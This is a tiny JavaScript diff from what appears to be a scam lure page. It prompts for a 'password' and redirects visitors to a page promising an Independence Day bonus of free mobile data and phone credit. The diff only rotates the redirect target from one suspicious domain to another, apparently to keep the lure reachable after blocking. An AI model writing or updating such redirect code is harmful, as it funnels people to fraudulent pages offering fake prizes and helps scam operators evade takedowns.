@@ -5,6 +5,6 @@ password = prompt(
 
 );if (password != '25GB DATA + Pulsa Rp30,000') {
 
-    location.href = 'https://www.squareopener.ink/bonus-perayaan-hari-kemerdekaan';
+    location.href = 'https://www.bendselectke.biz/bonus-perayaan-hari-kemerdekaan';
 
 }
